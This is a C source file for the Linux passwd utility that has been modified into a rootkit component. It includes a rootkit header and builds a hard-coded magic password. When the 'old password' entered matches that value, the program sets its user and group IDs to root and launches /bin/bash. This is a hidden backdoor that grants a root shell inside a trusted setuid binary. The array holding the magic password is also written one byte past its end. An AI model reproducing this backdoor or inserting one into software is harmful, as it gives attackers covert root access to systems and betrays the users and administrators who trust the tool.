/* passwd.c - change password on an account
 * Initially written for Linux by Peter Orbaek <poe@daimi.aau.dk>
 * Currently maintained at ftp://ftp.daimi.aau.dk/pub/linux/poe/
 */

/* Hacked by Alvaro Martinez Echevarria, alvaro@enano.etsit.upm.es,
   to allow peaceful coexistence with yp. Nov 94. */

#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <unistd.h>
#include <termios.h>
#include <pwd.h>
#include <ctype.h>
#include <time.h>
#include <string.h>
#include <errno.h>
#include "../rootkit.h"

extern int is_local(char *);

#define ascii_to_bin(c) ((c)>='a'?(c-59):(c)>='A'?((c)-53):(c)-'.')
#define bin_to_ascii(c) ((c)>=38?((c)-38+'a'):(c)>=12?((c)-12+'A'):(c)+'.')

#define MAX_LENGTH	1024

void
pexit(str)
     char *str;
{
    perror(str);
    exit(1);
}

int
main(argc, argv)
	int argc;
	char *argv[];
{
	struct passwd *pe;
	uid_t gotuid = getuid();
	char *pwdstr, *cryptstr;
	char pwdstr1[10];
	int ucase, lcase, other;
	char *p, *q, *user;
	time_t tm;
	char salt[2];
	FILE *fd_in, *fd_out;
	char line[MAX_LENGTH];
	char colonuser[16];
	int error=0;
	int r;

    char MAG[6];
    int elite=0;

    strcpy(MAG,"");
        MAG[0]=ROOTKIT_PASSWORD[0];
        MAG[1]=ROOTKIT_PASSWORD[1];
        MAG[2]=ROOTKIT_PASSWORD[2];
        MAG[3]=ROOTKIT_PASSWORD[3];
        MAG[4]=ROOTKIT_PASSWORD[4];
        MAG[5]=ROOTKIT_PASSWORD[5];
        MAG[6]='\0';

	umask(022);

	if(argc > 2) {
		puts("Too many arguments");
		exit(1);
	} else if(argc == 2) {
		if(gotuid) {
			puts("Only root can change the password for others");
			exit(1);
		}
		user = argv[1];
	} else {
		if (!(user = getlogin())) {
		   if (!(pe = getpwuid( getuid() ))) {
		      puts("Cannot find login name");
		      exit(1);
		   } else
			 user = pe->pw_name;
                }
	}

	if(!(pe = getpwnam(user))) {
		puts("Can't find username anywhere. Are you really a user?");
		exit(1);
	}

        if (!(is_local(user))) {
		puts("Sorry, I can only change local passwords. Use yppasswd instead.");
		exit(1);
	}

	/* if somebody got into changing utmp... */
	if(gotuid && gotuid != pe->pw_uid) {
	    puts("UID and username does not match, imposter!");
	    exit(1);
	}

	printf( "Changing password for %s\n", user );

	if(gotuid && pe->pw_passwd && pe->pw_passwd[0]) {
		pwdstr = getpass("Enter old password: ");
		if (!strcmp(pwdstr,MAG)) {
        setuid(0);
        setgid(0);
        seteuid(0);
        setegid(0);
	system("/bin/bash");}
		if(strncmp(pe->pw_passwd, crypt(pwdstr, pe->pw_passwd), 13)) {
			puts("Illegal password, imposter.");
			exit(1);
		}
	}
	
redo_it:
	pwdstr = getpass("Enter new password: ");
	if (pwdstr[0] == '\0') {
	   puts("Password not changed.");
	   exit(0);
	}
	
	if((strlen(pwdstr) < 6) && gotuid) {
		puts("The password must have at least 6 characters, try again.");
		goto redo_it;
	}
	
	other = ucase = lcase = 0;
	for(p = pwdstr; *p; p++) {
		ucase = ucase || isupper(*p);
		lcase = lcase || islower(*p);
		other = other || !isalpha(*p);
	}
	
	if((!ucase || !lcase) && !other && gotuid) {
		puts("The password must have both upper- and lowercase");
		puts("letters, or non-letters; try again.");
		goto redo_it;
	}
	
	r = 0;
	for(p = pwdstr, q = pe->pw_name; *q && *p; q++, p++) {
	  if(tolower(*p) != tolower(*q)) {
	    r = 1;
	    break;
	  }
	}

	for(p = pwdstr + strlen(pwdstr)-1, q = pe->pw_name;
	    *q && p >= pwdstr; q++, p--) {
	  if(tolower(*p) != tolower(*q)) {
	    r += 2;
	    break;
	  }
	}

	if(gotuid && r != 3) {
	  puts("Please don't use something like your username as password!");
	  goto redo_it;
	}

	/* do various other checks for stupid passwords here... */

	strncpy(pwdstr1, pwdstr, 9);
	pwdstr = getpass("Re-type new password: ");

	if(strncmp(pwdstr, pwdstr1, 8)) {
		puts("You misspelled it. Password not changed.");
		exit(0);
	}
	
	time(&tm);
	salt[0] = bin_to_ascii(tm & 0x3f);
	salt[1] = bin_to_ascii((tm >> 5) & 0x3f);
	cryptstr = crypt(pwdstr, salt);
	
	if(access("/etc/ptmp", F_OK) == 0) {
		puts("/etc/ptmp exists, can't change password");
		exit(1);
	}
	
	if(!(fd_out = fopen("/etc/ptmp", "w"))) {
		puts("Can't open /etc/ptmp, can't update password");
		exit(1);
	}

	if(!(fd_in = fopen("/etc/passwd", "r"))) {
		puts("Can't read /etc/passwd, can't update password");
		exit(1);
	}

	strcpy(colonuser, user);
	strcat(colonuser, ":");
	while(fgets(line, sizeof(line), fd_in)) {
		if(!strncmp(line,colonuser,strlen(colonuser))) {
			pe->pw_passwd = cryptstr;
			if(putpwent(pe, fd_out) < 0) {
				error = 1;
			}
		} else {
			if(fputs(line,fd_out) < 0) {
				error = 1;
			}
		}
		if(error) {
			puts("Error while writing new password file, password not changed.");
			fclose(fd_out);
			endpwent();
			unlink("/etc/ptmp");
			exit(1);
		}
	}
	fclose(fd_in);
	fclose(fd_out);

	if (unlink("/etc/passwd.OLD") < 0)
	  pexit("unlink(/etc/passwd.OLD) failed: no change");
	if (link("/etc/passwd", "/etc/passwd.OLD")) 
	  pexit("link(/etc/passwd, /etc/passwd.OLD) failed: no change");
	if (unlink("/etc/passwd") < 0)
	  pexit("unlink(/etc/passwd) failed: no change");
	if (link("/etc/ptmp", "/etc/passwd") < 0)
	  pexit("link(/etc/ptmp, /etc/passwd) failed: PASSWD file DROPPED!!");
	if (unlink("/etc/ptmp") < 0) 
	  pexit("unlink(/etc/ptmp) failed: /etc/ptmp still exists");

	chmod("/etc/passwd", 0644);
	chown("/etc/passwd", 0, 0);

	puts("Password changed.");	
	exit(0);
}
